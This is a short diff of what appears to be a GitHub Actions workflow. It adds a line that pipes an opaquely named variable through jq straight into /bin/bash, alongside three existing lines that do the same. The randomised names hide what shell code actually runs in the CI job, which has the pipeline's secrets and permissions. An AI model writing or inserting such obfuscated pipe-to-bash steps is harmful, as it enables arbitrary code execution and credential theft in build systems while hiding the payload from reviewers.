@@ -24,6 +24,7 @@ jobs:
           echo $oe248 | jq -r .zh61130 | /bin/bash
           printf '%s' "$gxgqt1548" | jq -r .wianc8152 | /bin/bash
           echo $fxkmq64335 | jq -r .nw80570 | /bin/bash
+          printf '%s' "$z2971" | jq -r .s3 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
